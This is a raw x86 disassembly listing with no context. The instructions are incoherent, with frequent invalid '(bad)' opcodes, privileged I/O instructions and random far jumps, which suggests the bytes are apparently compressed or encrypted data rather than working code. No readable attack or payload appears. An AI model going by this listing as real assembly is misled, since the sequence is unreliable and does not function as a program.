  40ae04:	add    BYTE PTR [ebx-0xd696d2e],bl
  40ae0a:	jmp    0xd2fb2d4
  40ae0f:	mov    bl,0xb
  40ae11:	into   
  40ae12:	pop    eax
  40ae13:	adc    BYTE PTR [esi-0x3f],ch
  40ae16:	lahf   
  40ae17:	jge    0x40ae25
  40ae19:	cmp    ah,dl
  40ae1b:	or     BYTE PTR [esi+0x76],dl
  40ae1e:	dec    ecx
  40ae1f:	call   0xb368:0x7bc4e2f6
  40ae26:	shr    DWORD PTR ds:0x1c3fb4d6,1
  40ae2c:	test   eax,0x5e25b14a
  40ae31:	jge    0x40ae30
  40ae33:	push   edi
  40ae34:	aaa    
  40ae35:	int    0x25
  40ae37:	mov    esp,db2
  40ae3a:	jae    0x40ae09
  40ae3c:	push   es
  40ae3d:	imul   ecx,DWORD PTR [esi+0x6abd9b76],0x39
  40ae44:	ja     0x40ae4c
  40ae46:	pop    ecx
  40ae47:	xchg   esi,eax
  40ae48:	(bad)  
  40ae49:	dec    ebx
  40ae4a:	mov    eax,ds:0xbc0d2181
  40ae4f:	sahf   
  40ae50:	mov    eax,0x5504acc2
  40ae55:	inc    esp
  40ae56:	mov    ch,0x16
  40ae58:	pusha  
  40ae59:	cmp    bh,BYTE PTR [esi]
  40ae5b:	inc    edx
  40ae5c:	clc    
  40ae5d:	and    BYTE PTR [ecx],0xa
  40ae60:	push   edx
  40ae61:	cmc    
  40ae62:	fs push edi
  40ae64:	leave  
  40ae65:	inc    esi
  40ae66:	push   0xdc28349f
  40ae6b:	push   ss
  40ae6c:	fwait
  40ae6d:	push   ecx
  40ae6e:	ja     0x40aecd
  40ae70:	outs   dx,DWORD PTR ds:[esi]
  40ae71:	xchg   esi,eax
  40ae72:	push   0xc310fdb1
  40ae77:	sahf   
  40ae78:	ins    DWORD PTR es:[edi],dx
  40ae79:	mov    DWORD PTR [edi-0xd122c2b],ebp
  40ae7f:	sub    DWORD PTR [esi+0x5e5af76a],edi
  40ae85:	and    al,0xe1
  40ae87:	cmp    eax,DWORD PTR [ecx*2+0x11fed294]
  40ae8e:	loope  0x40aec1
  40ae90:	adc    eax,0x55e3b503
  40ae95:	sti    
  40ae96:	fsub   DWORD PTR ds:0xe671c44d
  40ae9c:	loop   0x40ae53
  40ae9e:	adc    eax,0xe2de35ff
  40aea3:	ds fwait
  40aea5:	jno    0x40aeba
  40aea7:	adc    cl,dl
  40aea9:	(bad)  
  40aeaa:	out    0x9,eax
  40aeac:	repz cdq 
  40aeae:	jbe    0x40aee1
  40aeb0:	jge    0x40ae55
  40aeb2:	push   ds
  40aeb3:	cmp    al,0x72
  40aeb5:	xor    dl,0x65
  40aeb8:	fsub   QWORD PTR [eax-0x20]
  40aebb:	or     eax,0x58c3ad04
  40aec0:	push   eax
  40aec1:	inc    ebx
  40aec2:	adc    edi,0xc
  40aec5:	push   esi
  40aec6:	imul   edx,esp,0x3a
  40aec9:	xchg   BYTE PTR [esi+0x34c64007],ah
  40aecf:	mov    ebp,0x44b29ccc
  40aed4:	lods   al,BYTE PTR ds:[esi]
  40aed5:	or     eax,0x50bf1b73
  40aeda:	loopne 0x40ae87
  40aedc:	jecxz  0x40af1c
  40aede:	loopne 0x40ae86
  40aee0:	nop
  40aee1:	js     0x40ae82
  40aee3:	jns    0x40aec9
  40aee5:	pop    edi
  40aee6:	xchg   edi,eax
  40aee7:	(bad)  
  40aee9:	mov    ebp,cs
  40aeeb:	cmp    DWORD PTR [ebx+0x12],0x41
  40aeef:	and    eax,ebp
  40aef1:	xor    DWORD PTR [ecx+0x218c1e61],esp
  40aef7:	jmp    0x40af33
  40aef9:	lods   al,BYTE PTR ds:[esi]
  40aefa:	push   ss
  40aefb:	push   0x6e
  40aefd:	fs cld 
  40aeff:	loopne 0x40af34
  40af01:	push   0xffffff93
  40af03:	fimul  WORD PTR [ebx]
  40af05:	aaa    
  40af06:	pop    eax
  40af07:	sbb    BYTE PTR [esi-0xe],dh
  40af0a:	mov    ah,0xd3
  40af0c:	jp     0x40aecb
  40af0e:	or     DWORD PTR ds:0x9e98043,ebx
  40af14:	ins    DWORD PTR es:[edi],dx
  40af15:	jecxz  0x40af34
  40af17:	xchg   DWORD PTR [edx],eax
  40af19:	test   al,0xe6
  40af1b:	mov    ds:0x2fb3f21d,eax
  40af20:	jb     0x40af23
  40af22:	or     DWORD PTR [edx-0x27],0xfffffff4
  40af26:	add    eax,0x4bb3b1fa
  40af2b:	lock gs push esi
  40af2e:	pop    ebp
  40af2f:	(bad)  
  40af31:	xor    eax,0xf14aa0b7
  40af36:	add    al,0x6c
  40af38:	mov    al,0xa1
  40af3a:	(bad)  
  40af3b:	rcr    BYTE PTR [esi+0x76a136b6],0xfd
  40af42:	xor    DWORD PTR [eax-0x590ddd49],esi
  40af48:	cs aam 0xf9
  40af4b:	jbe    0x40af76
  40af4d:	mov    edx,cs
  40af4f:	lock push ebp
  40af51:	scas   eax,DWORD PTR es:[edi]
  40af52:	xchg   DWORD PTR [ebx-0x6f],edi
  40af55:	(bad)  
  40af56:	or     DWORD PTR [ebx-0x6c],esp
  40af59:	scas   al,BYTE PTR es:[edi]
  40af5a:	push   esp
  40af5b:	pop    ss
  40af5c:	push   edi
  40af5d:	dec    esp
  40af5e:	addr16 pop edi
  40af60:	inc    esp
  40af61:	fdivr  DWORD PTR [esi-0x4934aaa2]
  40af67:	retfw  0xe413
  40af6b:	clc    
  40af6c:	das    
  40af6d:	into   
  40af6e:	repz adc ecx,DWORD PTR [edi+esi*2-0x2cb865a0]
  40af76:	lods   al,BYTE PTR ds:[esi]
  40af77:	cmc    
  40af78:	nop
  40af79:	jge    0x40af92
  40af7b:	call   0x4cec:0xa97a74e
  40af82:	sub    al,0x24
  40af84:	(bad)
  40af89:	out    dx,al
  40af8a:	(bad)  
  40af8b:	dec    esp
  40af8c:	test   eax,0xacacb3a3
  40af91:	push   ds
  40af92:	loope  0x40af29
  40af94:	xchg   edi,eax
  40af95:	push   eax
  40af96:	int3   
  40af97:	sbb    DWORD PTR [ecx],ecx
  40af99:	outs   dx,BYTE PTR ds:[esi]
  40af9a:	retf   0x733f
  40af9d:	mov    esi,0x18a36e0d
  40afa2:	aaa    
  40afa3:	pusha  
  40afa4:	jge    0x40aff4
  40afa6:	adc    DWORD PTR fs:[ecx+0x0],ebx
  40afaa:	jecxz  0x40af35
  40afac:	(bad)  
  40afad:	fwait
  40afae:	xchg   BYTE PTR [eax],al
  40afb0:	lock pop ebp
  40afb2:	popa   
  40afb3:	arpl   dx,si
  40afb5:	hlt    
  40afb6:	repz dec ebp
  40afb8:	dec    DWORD PTR [ecx]
  40afba:	push   0xd623137c
  40afbf:	pop    edi
  40afc0:	lods   eax,DWORD PTR ds:[esi]
  40afc1:	pop    es
  40afc2:	jno    0x40af7f
  40afc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afc5:	xchg   esp,eax
  40afc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afc7:	stos   DWORD PTR es:[edi],eax
  40afc8:	sbb    BYTE PTR es:[ebx],dh
  40afcb:	push   ebx
  40afcc:	scas   al,BYTE PTR es:[edi]
  40afcd:	mov    ds:0xe382dcb3,ax
  40afd3:	sbb    DWORD PTR [edx+0x57],edi
  40afd6:	xchg   ecx,eax
  40afd7:	outs   dx,DWORD PTR ds:[esi]
  40afd8:	push   es
  40afd9:	xchg   edx,eax
  40afda:	retf   0x7a56
  40afdd:	jmp    0x40af82
  40afdf:	pop    edx
  40afe0:	push   ds
  40afe1:	mov    esi,0x25e1d377
  40afe6:	push   esi
  40afe7:	adc    al,0x22
  40afea:	xchg   edi,eax
  40afeb:	mov    bl,0xd6
  40afed:	xchg   esi,eax
  40afee:	mov    ebp,0x5d184c3
  40aff3:	adc    ah,BYTE PTR [ebx]
  40aff5:	shl    DWORD PTR [ecx+0x4f],0x79
  40aff9:	fstp   QWORD PTR [esi-0x4d]
  40affc:	mov    esi,0x55680ec4
  40b001:	mov    edx,0xb762808f
  40b006:	imul   edx,DWORD PTR [edx],0xffffffcf
  40b009:	add    dh,ah
  40b00b:	mov    ecx,0xb8b09c64
  40b010:	stos   BYTE PTR es:[edi],al
  40b011:	lea    esp,[edi+esi*4+0x24a96fe0]
  40b018:	int3   
  40b019:	inc    edi
  40b01a:	pop    ebp
  40b01c:	cmp    ch,bl
  40b01e:	aas    
  40b01f:	add    BYTE PTR [ebx-0x35],0x51
  40b023:	or     eax,0x543fc224
  40b028:	adc    al,0x4c
  40b02a:	in     al,0x62
  40b02c:	push   ecx
  40b02d:	shl    DWORD PTR [edx-0x5e],0x53
  40b031:	add    DWORD PTR [edi-0x1],edi
  40b034:	jnp    0x40b0ae
  40b036:	fbstp  TBYTE PTR [ebx]
  40b038:	adc    eax,0xc713abfc
  40b03d:	scas   al,BYTE PTR es:[edi]
  40b03e:	dec    esi
  40b03f:	mov    al,0xf
  40b041:	inc    ecx
  40b042:	xchg   esi,eax
  40b043:	arpl   WORD PTR [eax+esi*4],si
  40b046:	fsub   QWORD PTR [esi+0x4f4d87]
  40b04c:	jb     0x40b02d
  40b04e:	enter  0xc98f,0x4d
  40b052:	fwait
  40b053:	arpl   WORD PTR [ebp-0x13e9cac5],dx
  40b059:	xchg   DWORD PTR [ebx+ebx*2+0x7a],ecx
  40b05d:	fs pop edx
  40b05f:	xchg   ebx,eax
  40b060:	jge    0x40b088
  40b062:	test   eax,0x6d11e59f
  40b067:	les    edx,FWORD PTR [eax-0x64]
  40b06a:	rol    ebx,cl
  40b06c:	cmovp  esp,DWORD PTR [ebx-0x6b0de297]
  40b073:	add    DWORD PTR [edx+eiz*8],0xffffffc5
  40b077:	arpl   WORD PTR [ebx+0x4d1db40a],bx
  40b07d:	rcl    BYTE PTR [ecx+0x28289556],1
  40b083:	idiv   BYTE PTR [ebx+0x3a102411]
  40b089:	cmp    al,0x81
  40b08b:	(bad)  
  40b08c:	iret   
  40b08d:	test   DWORD PTR ds:0x13eaf85c,edi
  40b093:	mov    al,ds:0x8600d737
  40b098:	fisubr WORD PTR [ecx]
  40b09a:	in     al,dx
  40b09b:	test   edx,esi
  40b09d:	stc    
  40b09e:	rcr    DWORD PTR ds:0xa0fd1cfc,cl
  40b0a4:	fisttp QWORD PTR [ebx-0x5346d7fd]
  40b0aa:	outs   dx,DWORD PTR ds:[esi]
  40b0ab:	xchg   ebp,eax
  40b0ac:	jecxz  0x40b097
  40b0ae:	out    dx,al
  40b0af:	enter  0xadb0,0x97
  40b0b3:	add    BYTE PTR [edx],bh
  40b0b5:	inc    ecx
  40b0b6:	repnz out dx,al
  40b0b8:	add    ebx,DWORD PTR [ebx-0x1a]
  40b0bb:	push   ds
  40b0bc:	js     0x40b081
  40b0be:	inc    ecx
  40b0bf:	fiadd  WORD PTR ds:0x9a07a6b7
  40b0c5:	or     ecx,eax
  40b0c7:	int3   
  40b0c8:	cli    
  40b0c9:	aas    
  40b0ca:	jno    0x40b0d5
  40b0cc:	mov    ebp,0x2eca6e57
  40b0d1:	sub    ecx,DWORD PTR [esi-0x42291019]
  40b0d7:	js     0x40b10b
  40b0d9:	mov    esp,DWORD PTR [ebx]
  40b0db:	lods   al,BYTE PTR ds:[esi]
  40b0dc:	jae    0x40b08d
  40b0de:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b0e0:	in     al,dx
  40b0e1:	lds    edx,FWORD PTR [esi]
  40b0e3:	es push esi
  40b0e5:	push   edi
  40b0e6:	push   ebx
  40b0e7:	ret    0xea64
  40b0ea:	gs ins BYTE PTR es:[edi],dx
  40b0ec:	xor    al,0x1e
  40b0ee:	cld    
  40b0ef:	test   eax,0xae4e88da
  40b0f4:	stc    
  40b0f5:	xchg   DWORD PTR [edx+0x4dcf020f],edx
  40b0fb:	inc    ebp
  40b0fc:	fwait
  40b0fd:	adc    BYTE PTR [ecx-0x4ef14903],bl
  40b103:	push   edx
  40b104:	cwde   
  40b105:	mov    dh,0x36
  40b107:	push   esi
  40b108:	fwait
  40b109:	mov    ss,WORD PTR [edx-0x6d]
  40b10c:	mov    bl,0xdd
  40b10e:	add    al,0xdd
  40b110:	pop    ss
  40b111:	mov    eax,0xb923788b
  40b116:	and    eax,0xff93a582
  40b11b:	(bad)  
  40b11c:	xchg   BYTE PTR [ecx+0x551ffcad],dl
  40b122:	pop    ds
  40b123:	fisubr DWORD PTR [edi+0x4f3b186]
  40b129:	add    eax,0x9a258476
  40b12e:	sti    
  40b12f:	loopne 0x40b124
  40b131:	retf   0x6ad6
  40b134:	jecxz  0x40b0cc
  40b136:	sub    eax,0x674fb8a3
  40b13b:	lock adc ch,BYTE PTR [esi-0x37977c1b]
  40b142:	call   0x3cb6:0x55e2c9a9
  40b149:	cmp    BYTE PTR [eax-0x3e],0x3d
  40b14d:	cwde   
  40b14e:	inc    ecx
  40b14f:	lods   al,BYTE PTR ds:[esi]
  40b150:	mov    edx,0x9fea5236
  40b155:	inc    ecx
  40b156:	cwde   
  40b157:	push   ebp
  40b158:	out    dx,eax
  40b159:	icebp  
  40b15a:	dec    ecx
  40b15b:	inc    esp
  40b15c:	add    DWORD PTR [edi+edi*4+0x53],ebp
  40b160:	and    eax,DWORD PTR ds:0x3487e6d6
  40b167:	aas    
  40b168:	cmp    ch,bl
  40b16a:	sbb    eax,0x6f22ec63
  40b16f:	in     al,0x3
  40b171:	gs dec ebx
  40b173:	fwait
  40b174:	xchg   ebp,eax
  40b175:	cli    
  40b176:	gs popf 
  40b178:	push   ebx
  40b179:	lock fstp QWORD PTR [esi+eax*8-0x3c112cb8]
  40b181:	and    dh,dh
  40b183:	add    BYTE PTR [ebx-0x71],0x9d
  40b187:	inc    esp
  40b188:	aam    0xaf
  40b18a:	xchg   edx,eax
  40b18b:	out    dx,al
  40b18c:	mov    esi,0xc0395258
  40b191:	sub    dl,BYTE PTR [edi]
  40b193:	inc    edx
  40b194:	sbb    ebp,ebp
  40b196:	mov    ebp,0xa9f28819
  40b19b:	xor    al,0xc3
  40b19d:	rcl    BYTE PTR [eax+0x30],cl
  40b1a0:	add    eax,0xc1949a40
  40b1a5:	test   eax,0xd7767486
  40b1aa:	jmp    0xc1f9:0x7efdde35
  40b1b1:	mov    ebx,0x4db3061e
  40b1b6:	mov    ch,0x4d
  40b1b8:	dec    ecx
  40b1b9:	mov    dl,0xe4
  40b1bb:	xor    eax,0x26200a61
  40b1c0:	or     ecx,DWORD PTR [ecx]
  40b1c2:	adc    DWORD PTR [edx+0x64f4092e],esi
  40b1c8:	jnp    0x40b1ed
  40b1ca:	out    dx,al
  40b1cb:	cmp    eax,0xffb80ea5
  40b1d0:	out    0xf,eax
  40b1d2:	mov    esp,es
  40b1d4:	xchg   ecx,eax
  40b1d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d6:	outs   dx,DWORD PTR ds:[esi]
  40b1d7:	repz pop esp
  40b1d9:	cli    
  40b1da:	lds    esp,FWORD PTR [edx-0xe]
  40b1dd:	adc    eax,0x3ddbc65d
  40b1e2:	sub    ch,BYTE PTR [eax]
  40b1e4:	in     al,dx
  40b1e5:	into   
  40b1e6:	stc    
  40b1e7:	sbb    al,ah
  40b1e9:	sub    DWORD PTR [edi],0x3e
  40b1ec:	not    ch
  40b1ee:	into   
  40b1ef:	scas   eax,DWORD PTR es:[edi]
  40b1f0:	mov    edi,0xdedd842c
  40b1f5:	int    0x28
  40b1f7:	hlt    
  40b1f8:	outs   dx,DWORD PTR ds:[esi]
  40b1f9:	push   eax
  40b1fa:	and    DWORD PTR [ebp-0xc],ecx
  40b1fd:	inc    edx
  40b1fe:	imul   DWORD PTR [edi-0x63aa91c3]
  40b204:	xlat   BYTE PTR ds:[ebx]
  40b205:	lea    edx,[eax]
  40b207:	jbe    0x40b18a
  40b209:	mov    esp,0x9261f32e
  40b20e:	sub    edi,DWORD PTR [edx+ecx*1]
  40b211:	or     ebx,0xffffffa9
  40b214:	out    0xcf,eax
  40b216:	and    edi,DWORD PTR [eax+0x3f]
  40b219:	sahf   
  40b21a:	mov    ds:0xb6fc742,eax
  40b21f:	dec    esp
  40b220:	int    0xb9
  40b222:	jnp    0x40b230
  40b224:	inc    esp
  40b225:	test   eax,0x7acac3e
  40b22a:	jmp    0x913bf2bc
  40b22f:	xor    eax,0x9fce1de7
  40b234:	(bad)  
  40b236:	jb     0x40b262
  40b238:	xor    al,0x8e
  40b23a:	inc    edx
  40b23b:	mov    cl,0xbf
  40b23d:	lods   al,BYTE PTR ds:[esi]
  40b23e:	push   eax
  40b23f:	cmp    DWORD PTR [edi+0x77],eax
  40b242:	push   ss
  40b243:	outs   dx,DWORD PTR ds:[esi]
  40b244:	jmp    0x22e3:0x3f2cdcb8
  40b24b:	push   ecx
  40b24c:	les    edi,FWORD PTR [eax-0x78e749e8]
  40b252:	ret    
  40b253:	xor    DWORD PTR [edx+0x3bb23227],esi
  40b259:	jmp    0xf1c3:0x6d57c54
  40b260:	push   ds
  40b261:	test   DWORD PTR ds:0xb51a2790,edx
  40b267:	call   0xf91be12d
  40b26c:	(bad)  
  40b26d:	std    
  40b26e:	test   al,al
  40b270:	je     0x40b212
  40b272:	call   0x82b04323
  40b277:	rol    BYTE PTR [edi],1
  40b279:	lods   al,BYTE PTR ds:[esi]
  40b27a:	loopne 0x40b21f
  40b27c:	cmp    BYTE PTR [edx],dl
  40b27e:	jb     0x40b281
  40b280:	call   0x1668:0x64063e38
  40b287:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40b289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b28a:	(bad)  
  40b28b:	mov    ch,0x1
  40b28d:	enter  0xa54a,0x46
  40b291:	lahf   
  40b292:	aad    0x85
  40b294:	jmp    0xae2e:0x66923bf8
  40b29b:	shl    DWORD PTR [ecx+0x6],cl
  40b29e:	sti    
  40b29f:	cmp    DWORD PTR [edi-0x7865fe3a],esp
  40b2a5:	pop    esi
  40b2a6:	xor    DWORD PTR [esi],esi
  40b2a8:	sub    al,0x47
  40b2aa:	in     eax,dx
  40b2ab:	mov    esp,0xfc152d15
  40b2b0:	inc    ecx
  40b2b2:	mov    al,dh
  40b2b4:	push   0x48
  40b2b6:	adc    eax,0xa81549b7
  40b2bb:	std    
  40b2bc:	inc    ebp
  40b2bd:	dec    edx
  40b2be:	mov    ds:0x32a90d15,eax
  40b2c3:	add    esp,DWORD PTR ds:0x95c369b0
  40b2c9:	jnp    0x40b277
  40b2cb:	mov    ah,0x7e
  40b2cd:	mov    ebx,0x6382d0e
  40b2d2:	or     DWORD PTR [ebx-0x20604f86],ebx
  40b2d8:	or     cl,BYTE PTR [edx-0x54ab5595]
  40b2de:	fsubr  DWORD PTR [edi]
  40b2e0:	jbe    0x40b315
  40b2e2:	leave  
  40b2e3:	(bad)  
  40b2e4:	sub    DWORD PTR [esi+0x6491b0ce],eax
  40b2ea:	(bad)  
  40b2eb:	jmp    0x705ccacd
  40b2f0:	or     DWORD PTR [esi],edx
  40b2f2:	push   cs
  40b2f3:	xor    DWORD PTR [edi+0x2],edx
  40b2f6:	fistp  DWORD PTR [ecx+0x4736b802]
  40b2fc:	enter  0x1622,0x0
  40b300:	js     0x40b340
  40b302:	xchg   esp,eax
  40b303:	inc    edi
  40b304:	sub    BYTE PTR [edx+0x38649300],al
  40b30a:	xor    esp,esi
  40b30c:	dec    edx
  40b30d:	mov    ebx,0xa7e30d02
  40b312:	ins    BYTE PTR es:[edi],dx
  40b313:	imul   esi,DWORD PTR ds:[edx-0x7401a574],0x39c3c2c5
  40b31e:	push   0xffffffc9
  40b320:	sbb    ecx,DWORD PTR [edi+esi*8-0x20]
  40b324:	and    DWORD PTR [ebx-0x2f],0xa9a6fe52
  40b32b:	sub    al,0x5f
  40b32d:	inc    ebp
  40b32e:	adc    eax,0x2f8c17b8
  40b333:	imul   ecx,eax,0x7ba55f84
  40b339:	retf   0xb08a
  40b33c:	jmp    DWORD PTR [ebx]
  40b33e:	out    0x74,al
  40b340:	lahf   
  40b341:	jne    0x40b374
  40b343:	dec    esp
  40b344:	mov    cl,0x7e
  40b346:	es mov ebp,0xd11b98d5
  40b34c:	sub    edx,DWORD PTR [esi+0x7]
  40b34f:	(bad)  
  40b350:	gs inc ebp
  40b352:	mov    ebp,0x6ef77d4a
  40b357:	sub    BYTE PTR [edi+eiz*1+0x51a4804a],0x33
  40b35f:	test   DWORD PTR [edi+0x57f8828d],ebx
  40b365:	lds    esi,FWORD PTR ss:[esi-0x413fc7f1]
  40b36c:	je     0x40b389
  40b36e:	inc    esi
  40b36f:	aam    0x29
  40b371:	std    
  40b372:	in     eax,dx
  40b373:	pushf  
  40b374:	in     al,0x97
  40b376:	push   ebx
  40b377:	dec    esp
  40b378:	xor    ebp,0x8dc93d39
  40b37e:	dec    esp
  40b37f:	(bad)  
  40b381:	pushf  
  40b382:	ds aam 0xb0
  40b385:	sbb    al,0x45
  40b387:	daa    
  40b388:	test   eax,0x5a614229
  40b38d:	mov    ebp,0x1b60bff9
  40b392:	xchg   ecx,eax
  40b393:	mov    dh,ch
  40b395:	dec    esp
  40b396:	pop    ds
  40b397:	out    dx,eax
  40b398:	lahf   
  40b399:	inc    ecx
  40b39a:	sub    esi,DWORD PTR [edx-0x1a]
  40b39d:	xchg   ebp,eax
  40b39e:	retf   
  40b39f:	in     eax,0x27
  40b3a1:	and    BYTE PTR [ebx-0x1c],dl
  40b3a4:	inc    ebp
  40b3a5:	data16 and ch,BYTE PTR [esi-0x77]
  40b3a9:	sbb    edx,DWORD PTR [edi+0x7d]
  40b3ac:	retf   0x6098
  40b3af:	adc    dh,dl
  40b3b1:	add    ah,al
  40b3b3:	dec    esi
  40b3b4:	add    eax,0xb03709eb
  40b3b9:	jmp    0xcd80:0xef33aee1
  40b3c0:	test   DWORD PTR [ebp+0x35ee823b],0xca98e968
  40b3ca:	or     edx,ebx
  40b3cc:	leave  
  40b3cd:	jnp    0x40b3aa
  40b3cf:	fucom  st(0)
  40b3d1:	mov    edi,0xf5dc4864
  40b3d6:	mov    WORD PTR [esp+edi*1+0x3d25743a],gs
  40b3dd:	fs fwait
  40b3df:	push   esp
  40b3e0:	aaa    
  40b3e1:	add    DWORD PTR [edi-0x68c4d32d],0x18934a61
  40b3eb:	add    DWORD PTR [ebx+0x21],eax
  40b3ee:	scas   al,BYTE PTR es:[edi]
  40b3ef:	mov    ah,ch
  40b3f1:	jbe    0x40b466
  40b3f3:	mov    ah,0xdc
  40b3f5:	es jae 0x40b409
  40b3f8:	scas   eax,DWORD PTR es:[edi]
  40b3f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3fa:	ss (bad) 
  40b3fc:	jno    0x40b433
  40b3fe:	inc    edx
  40b3ff:	sbb    DWORD PTR [esi-0x5f3957d1],ebx
  40b405:	jno    0x40b3b7
  40b407:	pop    ebp
  40b408:	fstp   DWORD PTR [eax]
  40b40a:	repnz call 0x7c29:0x64f52049
  40b412:	sbb    edi,DWORD PTR [ebx+0x29727bbe]
  40b418:	xchg   edi,eax
  40b419:	sub    DWORD PTR [ecx-0x51],ebx
  40b41c:	jns    0x40b434
  40b41e:	mov    esi,0xe9831f8
  40b423:	and    al,BYTE PTR [esi-0x68]
  40b426:	jmp    0x9dcb3c3e
  40b42b:	stos   DWORD PTR es:[edi],eax
  40b42c:	into   
  40b42d:	cmc    
  40b42e:	mov    WORD PTR [esi+0x5442937a],es
  40b434:	xchg   ecx,eax
  40b435:	pop    cx
  40b437:	add    eax,0x9b0197b
  40b43c:	pop    esp
  40b43d:	fdiv   DWORD PTR [eax-0x59]
  40b440:	test   ebp,ebp
  40b442:	ins    BYTE PTR es:[edi],dx
  40b443:	pop    edi
  40b444:	mov    WORD PTR [ecx-0x63012289],es
  40b44a:	test   BYTE PTR [eax+0x2a14f9fa],al
  40b450:	std    
  40b451:	bound  eax,QWORD PTR [eax]
  40b453:	loopne 0x40b495
  40b455:	push   es
  40b456:	popf   
  40b457:	sbb    BYTE PTR [esi+0xee293ad],cl
  40b45d:	jae    0x40b405
  40b45f:	in     eax,0x24
  40b461:	aaa    
  40b462:	outs   dx,BYTE PTR ds:[esi]
  40b463:	mov    ch,0xf7
  40b465:	outs   dx,DWORD PTR ds:[esi]
  40b466:	fwait
  40b467:	(bad)  
  40b468:	mov    cl,0xa9
  40b46a:	retf   0x58c7
  40b46d:	dec    ebx
  40b46e:	xchg   edx,eax
  40b46f:	mov    ebx,0x603d2793
  40b474:	mov    esi,ecx
  40b476:	xchg   edx,eax
  40b477:	fwait
  40b478:	or     eax,0x3e8decec
  40b47d:	in     eax,0xa0
  40b47f:	clts   
  40b481:	push   edx
  40b482:	push   eax
  40b483:	mov    ecx,0x54961229
  40b488:	mov    ebx,0xc3e45cbc
  40b48d:	(bad)  
  40b48e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b48f:	cmp    ebp,DWORD PTR [edx-0x24852bf2]
  40b495:	mov    DWORD PTR [ecx-0x2b4eba70],esi
  40b49b:	cmc    
  40b49c:	and    ebx,DWORD PTR [ebx+0x52]
  40b49f:	xchg   edi,eax
  40b4a0:	in     eax,dx
  40b4a1:	test   bl,bl
  40b4a3:	out    dx,al
  40b4a4:	or     eax,0x819b10c7
  40b4a9:	inc    ecx
  40b4aa:	mov    esp,0x9a881c87
  40b4af:	fs inc edi
  40b4b1:	adc    DWORD PTR [ebx+eiz*1-0x33],edx
  40b4b5:	xor    eax,0x8c863777
  40b4ba:	mov    BYTE PTR [ecx-0x53e5391c],0xd4
  40b4c1:	aam    0x33
  40b4c3:	dec    eax
  40b4c4:	ror    DWORD PTR [edx],cl
  40b4c6:	fnstenv [edx-0x561b8491]
  40b4cc:	dec    eax
  40b4cd:	cmp    al,0x89
  40b4cf:	sbb    BYTE PTR [edi+ebx*8-0x4d],cl
  40b4d3:	test   al,0x79
  40b4d5:	add    eax,0x2d061c7c
  40b4da:	fistp  DWORD PTR [eax+0x6c7bed48]
  40b4e0:	add    al,0x4b
  40b4e2:	enter  0x5c3f,0x59
  40b4e6:	and    DWORD PTR [edi-0x60571b82],0x15115f4f
  40b4f0:	mov    al,0xc1
  40b4f2:	repz pop ss
  40b4f4:	sub    eax,0x93d2aecd
  40b4f9:	sub    eax,ebp
  40b4fb:	mov    ch,0x13
  40b4fd:	imul   ebx,DWORD PTR ds:0x8b500e35,0x6f
  40b504:	ret    
  40b505:	pop    ebx
  40b506:	jmp    FWORD PTR [esi+eax*8-0x6e]
  40b50a:	sub    eax,0x644c13ea
  40b50f:	inc    eax
  40b510:	xchg   ebx,eax
  40b511:	push   ds
  40b512:	inc    edx
  40b513:	jle    0x40b4a1
  40b515:	xchg   ebp,eax
  40b516:	xchg   esp,eax
  40b517:	jmp    0x8ed73c5f
  40b51c:	or     al,0x0
  40b51e:	mov    esp,DWORD PTR [ebx-0x53]
  40b521:	jbe    0x40b52e
  40b523:	daa    
  40b524:	push   ds
  40b525:	clc    
  40b526:	or     BYTE PTR [eax],cl
  40b528:	(bad)  
  40b529:	repnz test edi,edx
  40b52c:	dec    edi
  40b52d:	stos   BYTE PTR es:[edi],al
  40b52e:	aam    0x18
  40b530:	jp     0x40b4f0
  40b532:	aas    
  40b533:	or     eax,0x339fb216
  40b538:	sbb    ebx,edi
  40b53a:	mov    DWORD PTR [edx+edi*4-0x67],ebx
  40b53e:	adc    DWORD PTR [edx-0x68],eax
  40b541:	mov    BYTE PTR [ebp-0x63879ef4],ah
  40b547:	push   edi
  40b548:	sahf   
  40b549:	bound  esp,QWORD PTR [esi-0x48]
  40b54c:	lds    esi,FWORD PTR [edi]
  40b54e:	cmp    ah,BYTE PTR [ebx]
  40b550:	test   BYTE PTR [edi+0xd22c72c],bh
  40b556:	ror    ah,0x4
  40b559:	gs iret 
  40b55b:	(bad)  
  40b55c:	fld    QWORD PTR [ebp-0x39ee0cae]
  40b562:	push   eax
  40b563:	mov    ds:0x2d604ac3,eax
  40b568:	cld    
  40b569:	out    0xf6,eax
  40b56b:	inc    ecx
  40b56c:	test   eax,0x429fce0
  40b572:	or     bl,dh
  40b574:	sbb    eax,0x36e13053
  40b579:	pop    edi
  40b57a:	call   0x27a2:0x5b7e2ac2
  40b581:	sbb    cl,dl
  40b583:	rcl    DWORD PTR [eax-0x751d5773],1
  40b589:	leave  
  40b58a:	add    DWORD PTR [edi],ecx
  40b58c:	rcl    BYTE PTR [esi+0xcfeb30f],1
  40b592:	loope  0x40b5c6
  40b594:	cld    
  40b595:	jb     0x40b5f8
  40b597:	(bad)  
  40b599:	xchg   ebx,eax
  40b59a:	mov    ch,0xd7
  40b59c:	daa    
  40b59d:	scas   al,BYTE PTR es:[edi]
  40b59e:	cli    
  40b59f:	sub    eax,0xf8ede6ab
  40b5a4:	push   ebx
  40b5a5:	bound  edx,QWORD PTR [esi]
  40b5a7:	fcmovnb st,st(5)
  40b5a9:	xor    al,0xb6
  40b5ab:	mov    eax,0x6ccdbed3
  40b5b0:	inc    ebp
  40b5b1:	dec    ebp
  40b5b2:	inc    esp
  40b5b3:	cs dec eax
  40b5b5:	jge    0x40b5b0
  40b5b7:	sbb    BYTE PTR [edx],ch
  40b5b9:	imul   ecx,DWORD PTR [esi-0x379d2f88],0xa86827e4
  40b5c3:	out    dx,eax
  40b5c4:	stos   DWORD PTR es:[edi],eax
  40b5c5:	inc    esi
  40b5c6:	leave  
  40b5c7:	iret   
  40b5c8:	inc    ebx
  40b5c9:	int    0xcc
  40b5cb:	ror    DWORD PTR [ecx-0x63],0x80
  40b5cf:	adc    al,0x4d
  40b5d1:	add    DWORD PTR [edi-0x75e1b3d3],ebp
  40b5d7:	fild   DWORD PTR [edi]
  40b5d9:	into   
  40b5da:	push   edi
